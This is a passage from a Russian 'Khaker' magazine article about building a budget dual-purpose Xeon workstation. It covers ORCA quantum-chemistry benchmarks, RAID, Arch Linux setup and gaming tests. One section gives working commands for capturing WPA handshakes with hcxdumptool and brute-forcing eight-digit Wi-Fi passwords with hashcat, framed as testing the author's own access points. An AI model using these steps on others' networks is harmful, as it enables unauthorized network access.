дуемая им кон фигурация — это dual AMD EPYC 7R32 на 96 ядер. Исполь зуя
такую машину, автор провел исследование, насколь ко хорошо парал лелится
ORCA. Офи циальный мануал говорит, что до восьми ядер все параллелится
без нареканий, а с шестнад цатью уже возможны проблемы, но в мануале
это упоминается только вскользь.
   Так вот, согласно тес там Sobereva, при увеличе нии количества ядер
до 24 рост быстро действия почти линейный, от 24 до 48 он отклоняется
от линей ного. На отрезке от 48 до 84 ядер рост еще прослежива ется, а когда
их становится боль ше 84, при роста уже не наблюдается. Понятно, что эти
числа зависят от исполняемой задачи, но на низ ком уровне все кван-
тово-химические методы так или иначе сво дят ся к перемножению матриц,
нахождению собственных векторов и значений, так что эти резуль таты полез-
но держать в уме. Кро ме того, других тестов подобного раз маха я не встре-
чал.


ÈÒÅÐÀÖÈß ÏÅÐÂÀß

В своей сборке я решил сделать упор на объем памяти. На дворе стоял
январь 2022 года, кризис чипов был еще в разгаре, поэто му вариантов у меня
оставалось немного. Если хочешь большой объем DDR4, то дорога тебе
на «Али» за б/у сер верной памятью, а к ней нужен проц — тоже серверный б/
у Xeon. Цены тог да были, прямо скажем, нев кусные, и на память ушла
изрядная часть бюджета (8 × 32 Гбайт 2400 DDR4 ECC REG обошлось тогда
в сумму порядка 60 тысяч руб лей).
  Подер жанные серверные матери тогда в мой бюд жет не пролезли, и я
решил оста новиться на китайских. О китай ских матерях в целом ходит дур ная
молва. В час тности, одно из типич ных больных мест этих девайсов — цепи
питания CPU, то есть VRM, поэто му я попытался най ти что-то понадежнее,
нас колько это воз можно. Выбор пал на Huananzhi X99-F8: эта материнская
плата име ет активное охлаждение VRM, восемь слотов памяти и, само собой,
под держивает четырех канальный режим.
   Те перь о про цессоре. Пос кольку предполагалось, что машина будет дол-
гое вре мя работать в режиме 24/7 при практически полной нагрузке, ни о
каком разгоне и речи не шло, поэтому смотреть в сто рону Xeon 26xxv3 смыс-
ла особого не было, и я выбрал Xeon E5 2683v4. Это 16-ядерный про цессор
с частотой 2600 МГц при полной нагрузке. Скромненько, зато недорого:
в 2022 году он сто ил око ло пяти тысяч, а сейчас и вовсе меньше двух. Впос-
ледс твии, когда цены нем ного сни зились, я заменил камень другим —
E5 2696v4, где уже 22 ядра и 2800 МГц при полной нагрузке. Прирост про-
изводительности, прямо скажем, заметный, и это потолок для выб ранной
мною платформы, но он и сегодня смотрится довольно достой но.
  Для охлаждения всего этого дела я использовал китай скую «башню»
с шестью труб ками и тремя вен тиляторами.





                         Башня

Впро чем, такая система охлаждения оказалась даже избыточной, и тем-
пература под нагрузкой не пре выша ла 51 градус. Так что можно не париться
и ставить какой-нибудь ноунейм, одна ко он дол жен уметь отводить при мер-
но 150 Вт. Корпус я использовал Zalman S2, в него были установлены шесть
вентиляторов, три на вдув на фронтальной панели и три на выдув, один сзади
и два сверху. Верхние кулеры дос таточно удачно расположены над зоной
VRM. В целом этот корпус довольно дешевый, и боковая стенка плас тиковая,
ну да нам на него не любовать ся.
  Объем памяти поз же был уве личен до 512 Гбайт, но уже по стечению
обстоятельств. Любопытно: китай ские пла ты дер жат планки по 64 Гбайт, а в
сети я упо минания об этом не нашел, правда, возможно, потому, что никому
в здравом уме не придет в голову напихать в китай скую сборку полтерабай та
оператив ки. Да и задач, где нужны такие объемы памяти, кроме кван-
тово-химических расчетов, я так с ходу и не при думаю.





             Материн ская плата, проц, память, VRM

С дисками вышла целая чехарда. В первом вари анте я использовал под сис-
тему NVME SSD объемом 256 Гбайт и HDD на 3 Тбайт для хранения резуль-
татов вычислений. Но оказалось, что для исполь зования DLPNO-CCSD(T)
и  особен но STEOM-DLPNO-CCSD  этого  совсем  недостаточно:  мало
и 512 Гбайт, и 1 Тбайт. А если использовать HDD, то скорость записи/чтения
ста новит ся узким местом, особен но с увеличением количес тва потоков.
Доходит до смешного, ког да задача быстрее реша ется в восемь потоков, чем
в шестнад цать.
   Стало ясно, что нужен быстрый SSD на 1, а лучше на 2 или 3 Тбайт,
но цены на твердотельные накопители больше терабайта тогда были, прямо
скажем, негуман ные. Поэто му, почесав в затылке, я решил, что мне поможет
RAID 0. Так объем диска можно наращи вать постепенно, скорость будет рас-
ти и износ дис ков станет уменьшаться — в общем, одни плюсы. Что же
до надежности, то тут это не столь важно: на этих дисках не предполагалось
хранить результаты вычислений. В реализации этой идеи мне очень при-
годился адаптер PCIe-4NVME — удоб но, компак тно, и слоты PCIe эко номит.





                       Адаптер PCIe-4NVME

Надо иметь в виду, что если его прос то вот кнуть в слот x16, то будет работать
только первое гнездо M2. Чтобы зарабо тали осталь ные, в БИОСе нужно нас-
троить бифур кацию слота X16, то есть переключить режим работы с X16 на X4
X4 X4 X4, тог да все зарабо тает как надо. Не все материнские платы имеют
такую функцию. К счастью, Huananzhi X99-F8 это уме ет. В качес тве дисков я
выбрал недоро гие WD Blue SN550 объ емом 1 Тбайт, тем более в обзорах
указывалось, что они не склонны катастрофичес ки просаживать скорость
пос ле запол нения кеша.





                WD Blue SN550 1 Тбайт

Таким образом я со временем нарас тил мас сив до 3 Тбайт, и этого, если
не наг леть, хватает практически для всех задач. Впрочем, если не замахи-
вать ся на методы post HF, а ограничиться DFT, то и 1 Тбайт хва тит за глаза.
Для создания прог рам много RAID 0 я использовал mdadm, тут в общем нет
никаких особенностей, и ману алов в сети дос таточно. Работает такое
решение хорошо, однако есть вариант и получше: на алике можно найти
относительно недорого U2 SSD WD Black SN640 аж на 7,5 Тбайт — уль-
тиматив ное решение.
   Учитывая, что используемый мною софт, а именно ORCA, на данный
момент не уме ет работать с GPU, строгой необходимости в видеокарте
у меня не воз никло. Однако на эта пе нас трой ки и установки соф та без нее
не обойтись. В свою машину я пос тавил GTX 1080, она мне в свое время дос-
талась по очень прив лекательной цене. У китай ских плат есть один нюанс
в работе с виде окартами, связанный с настройками CSM: в нашей кон-
фигурации она должна быть выключена.





                        UEFI CSM Support setting

Ню анс тут в том, какие зна чения установлены в БИОСе по умолчанию. Так,
если в пункте video будет сто ять Legacy, то на GTX 1080 изображения ты
не уви дишь, толь ко черный экран. Как следствие, в БИОС ты не зайдешь
и настройки не поменяешь. Но проб лема реша емая: берем какую-нибудь
древ нюю видяху (проверял на GTX 640 и EAH4650), вты каем, заходим
в БИОС, меняем настройки, выключаем, ста вим назад GTX 1080. Если нужно
использовать старую виде окарту, а в нас тройках video стоит UEFI, то алго-
ритм дей ствий обратный. Подоз реваю, что эта особенность мно гим людям
попор тила нервы.
  В качестве бло ка питания я использовал Cooler Master Elite V4 600 Вт,
однако я бы рекомен довал иметь больший запас по мощности, так как при
пол ной нагрузке машина очень чувствительна к просад кам в сети. Бес-
перебойник не спасает: комп уходит в перезагрузку. Более мощный блок
питания позволя ет машине не вылетать, пока сра батывает бес перебойник.


ÏËÞÑÛ È ÌÈÍÓÑÛ

К плю сам моей сборки мож но отнести цену: старые Xeon стоят, прямо ска-
жем,  недорого,  особенно  если  не  гнать ся  за  топом  в  линейке
E5 2696v4 и E5 2699v4. Любопытно, что по факту это идентичные процы с той
лишь разницей, что E5 2696v4 поставлялся строго в составе серверов, поэто-
му относительно малоизвестен. Кро ме того, не все платы его поддерживают,
имей это в виду. У E5 2699v4 с поддер жкой вро де бы дела обстоят получше,
но и цена у него в пол тора-два раза выше. А в остальном они идентичны.
   Хо роший вари ант — E5 2690v4, ядер у него поменьше (14), но и частота
повыше: 3200 МГц при полной наг рузке. Сто ит он около двух тысяч. Еще к
плю сам мож но отнести то, что у меня материн ка по факту десктоп ная,
форм-фак тора ATX, влезает она прак тичес ки в любой корпус, да и заморочек
с ней меньше, чем с серверны ми.
  К  минусам  сто ит  отнести  потен циальную  ненадежность  китай ских
материнских плат. Судя по отзы вам в интернетах, они не то чтобы дохнут, нет,
но тут воля случая: может работать, а может и помереть, как повезет. Ну
и VRM у них горячий, о чем я уже писал выше.
  Моя работа ет без нарека ний, из замечен ных странностей только иногда
не стартует, зависая на ини циали зации, что лечит ся перезагрузкой. Правда,
такое случалось лишь пару раз. Также к минусам однозначно стоит отнести
баги с UEFI. Сам я багов не видел, но пишут, что в Huananzhi X99-
F8 не работает кор рекция ошибок памяти. Отсутс твие WOL тоже очень огор-
чает. И главный минус здесь, пожалуй, то, что со вре менем обновить эту
машину не вый дет, пос кольку текущая кон фигурация уже максимальная.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ



       СОБИРАЕМ МОЩНЫЙ КОМПЬЮТЕР
                  ДЛЯ ВЫЧИСЛЕНИЙ





ÑÎÔÒ

В качестве операци онной системы, разумеется, я использовал мой любимый
Arch Linux. Он устанавливается лег ко и без плясок с бубном. Так как моя
машина планировалась ско рее как рабочая стан ция, а не вычислительный
сервер, то сверху я накатил «иксы» и Openbox по заветам ArchWiki. Разве что
нас тоятельно рекомендую исполь зовать в fstab UUID-идентификаторы дис-
ков, потому как этих самых дисков в машине много и при ини циали зации наз-
начение им имен про исходит с элементами ран дома. В результате установ ка
и удаление новых дисков и PCIE-устройств тоже может поменять име на.
А UUID, в отли чие от имен, уникальны и не меня ются, что изба вит нас от неп-
риятных сюрпризов.
   То же самое касается и EFISTUB. В про тив ном слу чае может так получить-
ся, что машина будет грузиться через раз. Я, когда столкнул ся с таким
поведе нием, был несколько озадачен. Любопытно, что утилита efibootmgr
при нимает имя заг рузочного раздела, а в UEFI пишет уже UUID. Поэтому, нас-
траивая заг рузку, вызыва ем ebootmgr таким образом:


#efibootmgr -c -d /dev/nvme0n1 -p 1 -l \vmlinuz-linux -L "Arch
Linux" -u "initrd=/initramfs-linux.img root=UUID=part_uuid"

Только имена дисков не забудь поменять. Есть еще одна занятная шту ка:
некоторые материн ские платы не хотят гру зить ся с записи под номером 0000.
X99-F8 к таким не отно сит ся, но в уме это держать сто ит.
   Ну и напоследок я уста новил ORCA с официального сай та, для дос тупа
к которо му с недав них пор тре бует ся прокси или VPN (Tor не под ходит),
и Open MPI.


ÒÅÑÒ-ÄÐÀÉÂ

В качестве теста про изводительнос ти я решил использовать что-то приб-
лиженное к прак тическим задачам. На форуме chemport.ru нашлась инте рес-
ная тема, пос вященная сравнению про изводительности расчетных машин,
для которо го исполь зует ся тестовый input-файл для ORCA следующего
содержания:


! UKS b3lyp def2-tzvp tightscf defgrid3 nocosx nori
%pal nprocs N end
%method
AngularGrid 7
IntAcc 5.670
GridPruning OldPruning
BFCut 1e-11
WeightCut 1e-14
end
* xyz 0 1
7        5.263365000     -0.809094000      0.301207000
6        6.573875000     -0.272788000      0.577214000
6        7.676247000     -1.298471000      0.365855000
6        9.040975000     -0.709409000      0.673148000
7       10.148432000     -1.562897000      0.289452000
6       10.248995000     -2.816903000      1.002416000
6       11.415931000     -0.834654000      0.299215000
6       11.219991000     -3.722976000      0.274540000
6       12.616201000     -1.728404000      0.596641000
7       12.479498000     -3.040776000      0.008370000
6       13.574798000     -3.784343000     -0.374628000
6       13.407266000     -5.070792000     -0.923040000
6       14.889954000     -3.303523000     -0.241151000
6       14.497437000     -5.811691000     -1.337626000
6       15.954215000     -4.072569000     -0.671221000
6       15.794150000     -5.329993000     -1.225769000
7        4.835772000     -0.973795000     -0.996077000
6        4.395529000     -1.271139000      1.257513000
6        3.654749000     -1.533350000     -0.876188000
7        3.327586000     -1.736522000      0.465013000
6        2.715758000     -1.933372000     -1.852204000
6        1.545454000     -2.496808000     -1.443497000
6        2.154252000     -2.302219000      0.878375000
6        1.256931000     -2.685894000     -0.059367000
8        4.488440000     -1.288606000      2.474129000
17      17.581746000     -3.423758000     -0.479631000
1        2.033998000     -2.399764000      1.945985000
1        0.324817000     -3.133479000      0.248767000
1        0.816928000     -2.808697000     -2.178230000
1        2.953860000     -1.780764000     -2.894034000
1        6.554111000      0.068581000      1.610272000
1        6.717863000      0.592377000     -0.068151000
1        7.466435000     -2.155921000      1.004541000
1        7.658018000     -1.645300000     -0.666511000
1        9.150192000      0.220009000      0.109847000
1        9.093457000     -0.427101000      1.740796000
1       11.542924000     -0.345204000     -0.668225000
1       11.416418000     -0.043022000      1.063859000
1       13.490643000     -1.237666000      0.182744000
1       12.779915000     -1.795333000      1.679456000
1       11.393404000     -4.624746000      0.871541000
1       10.758268000     -4.030853000     -0.666412000
1       10.539040000     -2.692732000      2.059832000
1        9.281760000     -3.312189000      1.005791000
1       15.101308000     -2.351050000      0.214305000
1       16.645962000     -5.907387000     -1.549807000
1       14.333360000     -6.792112000     -1.764807000
1       12.419211000     -5.483721000     -1.049190000
*

В файле необходимо задать количество исполь зуемых ядер nproc N, а сам
этот файл запускает расчет  точечной энергии молекулы, приведенной
на рисунке.





                         Тестовая молеку ла

Ре зультаты тестов различных машин пред став лены ниже. Конечно, они
не совсем корректны, посколь ку версии ПО на разном железе отли чались,
тем не менее эти резуль таты позволяют прикинуть, насколько получившийся
у меня компьютер хорош. Последнее значение в каждой строке — время
выполнения вычис ления в формате чч:мм:сс, чем меньше, тем лучше.


i3-8100 4x3.60GHz 00:39:58
Ryzen 5500U 6x2.1GHz 00:31:24
i7-8700 6x3.2 GHz /8Gb DDR4 2666MHz /SATA HDD 0:30:18
dual Xeon X5650, 12x2.7GHz /144Gb DDR3 /ATA HDD 00:29:45
Xeon E5-2658v3 12x2.6GHz /32Gb DDR4 2133MHz /SATA HDD 00:23:15
i5-10600K, 6x4.5GHz /16Gb DDR4 /SDD   00:22:43
AMD Ryzen 7 3700X 8x3.6GHz   00:19:07
dual Intel Xeon E5-2680v2 10x3.6 GHz /64Gb DDR3 1066MHz /HDD 00:17:17
i9-10920x 12x3.5GHz /128Gb DDR4/M.2 SSD 00:14:40
dual Intel Xeon E5-2697v2 12x2.7GHz /256Gb DDR3 1600MHz /SATA HDD 0:
12:57
AMD Ryzen 9 5900X/32Gb/HDD 00:12:23
---
Xeon 2696v4 22x2.8GHz /512Gb DDR4 2400MHz /RAID0 M2 SSD 00:10:53
---
dual Xeon E5-2658V3 12x2.6 GHz /32Gb DDR4 2133MHz /HDD 00:10:19
AMD Ryzen 9 5950X 16x3.4GHz /64Gb DDR4 /M.2 SSD 00:07:33
Ryzen Threadripper 3970x, 32x3.7GHz /256Gb DDR4 3200MHz /SSD  0:05:32

В этом ряду собранная мною машина смотрится дос таточно неплохо, сущес-
твен но усту пая только AMD Ryzen 9 5950X и Ryzen Threadripper 3970x, что
неуди вительно: там один проц стоит, как вся моя сборка. В принципе,
из машины можно выжать еще немного быс тродействия, если отключить пат-
чи уязвимостей процессора, снижающие про изводительность. Так, добав-
ление mitigations=off в параметры ядра отключает эти патчи. Пос ле этого
тест завершает ся за 00:10:23, что дает выиг рыш в 30 с, или око ло 5%.
   Сто ит ли оно того, воп рос дискуссионный. Ну, если машина работает
в локалке и, кроме расчетов, на ней ничего не запускают, то, наверное, стоит.
Любопытный факт: при про ведении рас четов с таким количеством памяти
SSD практически не дает выиг рыша относительно HDD за счет хорошо
работа ющей системы кеширо вания файлов. То есть фактически чте ние
и запись идет из опе ративки. Исключение составляют только тяжелые методы
post HF типа STEOM-DLPNO-CCSD, которые имеют тенденцию съедать всю
память и еще прихватить несколько терабайт на диске под вре менные файлы.
Тут SSD существенно вырывается вперед.
  Читатель может задаться воп росом: не избыточно ли 512 Гбайт оператив-
ной памяти? Отве чу, что это можно считать хорошим запасом. Я наблюдал
на этой машине использование более 450 Гбайт памяти и, кроме того, видел
даже вылеты по причине нехватки оператив ки. В плане стабильности работы
у системы тоже все хорошо: так, несколько раз на ней выпол нялись вычис-
ления, занимав шие около недели, и это при почти полной нагрузке.


ÁÐÓÒÈÌ ÕÅØÈ

То, что машина умеет считать кванты, мы уже выяс нили, теперь можно поп-
робовать что-то более понят ное и осязаемое, нап ример брутфорс. Поэтому,
вооружившись  комплектом  hcxdumptool,  hcxtools  и  hashcat,  проведем
небольшой экспе римент.
  Представим себе, что мы хотим оценить безопас ность пароля бес провод-
ной точки доступа. Алго ритм действия такой: слушаем трафик с помощью
hcxdumptool, получен ные дампы рукопо жатий конвертируем с помощью
hcxpcapngtool в фор мат hash.hc22000, после чего пытаемся cбрутить
пароль с помощью hashcat. Для сбора рукопо жатий очень удобно исполь-
зовать отдельный ноут бук, это поз волит не заморачиваться с перек лючени ем
режимов работы Wi-Fi.
   Итак, берем наш ноут, относим его в хорошее мес то, где дос тупны все
наши тестовые точки дос тупа, и запускаем hcxdumptool.


sudo systemctl stop wpa_supplicant-nl80211@wlp1s0.service
sudo systemctl stop dhcpcd@wlp1s0.service
sudo hcxdumptool -i wlp1s0 -o dump.pcapng --active_beacon
--enable_status= 15

Тут мы выключаем сетевые службы wpa_supplicant и dhcpcd, поскольку нам
нужен пол ный контроль над сетевой картой. Здесь wlp1s0 — имя моей
сетевой карты, как ее зовут на тво ей машине, ты можешь узнать с помощью
коман ды ip link show.
  Мы получи ли дамп, теперь конверти руем его в нуж ный формат.


hcxpcapngtool -o hash0.hc22000 -E wordlist dump.pcapng

Пе рено сим  полученный дамп  на наш  «суперкомпьютер»  и  запускаем
hashcat. Мы будем использовать сразу и GPU, и CPU, для работы в обо их
режимах надо покол довать с драй верами — этот про цесс подробно описан
в мануалах.
   Когда-то я про читал очень интерес ную мысль: не быва ет стой ких паролей,
бывают плохие сло вари. Эта сентенция полностью характеризует положение
дел. С хорошим словарем ни у одной сети нет шан сов, но где его взять? Лет
десять назад среди паролей час то попада лись «цифровые восьмизнаки»,
и этой машине они вполне по плечу. Их и будем перебирать. Итак, под берем
цифровой восьмизначный пароль, благо тес товые точ ки доступа мы настра-
ивали сами и точно знаем, что там использует ся имен но такой.


hashcat -D 1,2 -m 22000 -a 3 hash0.hc22000 "?d?d?d?d?d?d?d?d" |tee
hashcatlog_bruteforce_cpu+gpu.txt

В нашем дампе было восемь записей. В про цессе брута мы видим сле-
дующую информацию.



  Session..........: hashcat
  Status...........: Running
  Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
  Hash.Target......: hash1.hc22000
  Time.Started.....: Sat Nov xx 19:34:11 20xx (1 min, 23 secs)
  Time.Estimated...: Sat Nov xx 19:53:47 20xx (18 mins, 13 secs)
  Kernel.Feature...: Pure Kernel
  Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
  Guess.Queue......: 1/1 (100.00%)
  Speed.#1.........:   457.5 kH/s (11.00ms) @ Accel:8 Loops:256 Thr:512
  Vec:1
  Speed.#3.........:    52739 H/s (3.34ms) @ Accel:32 Loops:512 Thr:1
  Vec:8
  Speed.#*.........:   510.2 kH/s
  Recovered........: 2/8 (25.00%) Digests (total), 0/8 (0.00%) Digests
  (new), 1/7 (14.29%) Salts
  Progress.........: 49590784/700000000 (7.08%)
  Rejected.........: 0/49590784 (0.00%)
  Restore.Point....: 631168/10000000 (6.31%)
  Restore.Sub.#1...: Salt:5 Amplifier:3-4 Iteration:1280-1536
  Restore.Sub.#3...: Salt:5 Amplifier:8-9 Iteration:0-512
  Candidate.Engine.: Device Generator
  Candidates.#1....: 34184288 → 35468755
  Candidates.#3....: 76995269 → 75973388
  Hardware.Mon.#1..: Temp: 75c Fan: 62% Util: 99% Core:1835MHz Mem:4513MHz
  Bus:16
  Hardware.Mon.#3..: Temp: 61c Util: 90%


Во-первых, железо чувству ет себя неплохо: 61 градус на CPU и 75 на GPU.
И это при том, что машина не оптимизи рова лась под работу видяхи на пол-
ной наг рузке. Во-вторых, мы видим, как GTX 1080 на этой задаче рвет Xeon
со страш ной силой: 450 kH против 50 kH. А в-третьих, бруту поддались две
из восьми записей, и такое положение дел сохранилось до конца перебора.
  Из это го мож но сделать вывод, что для брута паролей беспроводных
сетей эта машина не сбалансирована: нуж но боль ше видях, а вот проц
и память чудовищно избы точны. Десяток точек  Wi-Fi с восьмизначным
паролем в один заход ломаются видяхой за 25 тысяч пример но за десять
минут. Поэто му, если ты используешь восьмизначные циф ровые пароли,
у меня для тебя плохие новости.
  Ре зюме: машину можно использовать для прос тых задач по перебору
паролей, но если ориенти роваться имен но на них, то конфигурацию стоит
пересмотреть. Так, умень шив объем памяти и вста вив вто рую виде окарту, ты
под нимешь производительность в два раза и при этом еще и сэкономишь.


ÐÀÇÂËÅÊÓÕÀ ÍÀÏÎÑËÅÄÎÊ

А что насчет игрушек? Конечно, назвать этот аппа рат игро вым язык не повер-
нется, в здравом уме для игр такое никто собирать не будет. Мож но соб рать
игровой комп за цену одной только оперативки. Впрочем, в сети пол но
материалов по поводу игровых ПК на «зионах», и все сходятся на том, что эти
про цессоры для игр подходят плохо в основном из-за низкой про изводитель-
ности на одно ядро. Так что играть на Xeon разумно только из соображений
лютой  экономии, чем  в нашем  случае и  не  пахнет. Тем  не менее
какая-никакая видеокарта у нас есть, и в свое вре мя она была ого-го, так что
можно попробовать.
   Windows 10 LTSC ставится на этот компьютер совершенно штатным обра-
зом, корректно определяет процессор и видит всю оперативную память.
Игрушки тоже устанав лива ются без проблем. Все тесты проводи лись в раз-
решении Full HD, FPS я не измерял.
   Wolfenstein: New Order, Wolfenstein: New Colossus, Old Blood и Young Blood
на высоких настройках бегают очень бодро, фризов не видно. Cве жий Doom
тоже работает на ура. В пред релиз ную Atomic Heart игра ется нормально,
но на откры тых локаци ях FPS мес тами проседает до 15–20, правда, тут, воз-
можно, дело в багах самой игры, на то она и предрелизная версия.
   Cyberpunk 2077 идет комфортно, фризов не замече но. Что еще можно
попробовать, ког да у тебя 512 Гбайт опе ративы? Конечно, соз дать RAM-диск
и попытать ся запустить игрушки с него. Ска зано — сделано: име ем виртуаль-
ный диск на 256 Гбайт и еще столько же опе ративки в запасе. Тес ты я про-
водил на Wolfenstein new colossus и Cyberpunk 2077. Все-таки хорошо зву чит
«запустить кибер панк из оперативки», есть в этом что-то безум ное. В общем,
все успешно заг ружается, а вот скоростью я был разочарован: игра запус-
кается, конечно, быстрее, но не настолько, что бы ска зать «Вау!». Изме нений
в самом игровом про цессе я вообще не заметил. Короче, оно того не стоит.
Вывод я сде лал простой: счи тает собранный мною компьютер неплохо, а вот
для игр и брутфорса подходит неидеально, хотя если очень хочется, то его
можно использовать и таким образом.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №2 (299)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                      Ев гения Шарипова           yambuto
                        Литературный редактор         Бильд-редак тор
                                                   yambuto@gmail.com


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Учредитель: ИП Яков лева Анна Вадимов на ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Москов ская область,
Пушкино, мкр Соф рино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегис трирова но Федераль ной службой по надзору в сфере связи,
информа цион ных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обя зательно совпадает с мнением авторов. Все матери алы в номере предоставля ются как информа ция к раз мышлению. Лица,
использующие данную информа цию в про тиво законных целях, могут быть прив лечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024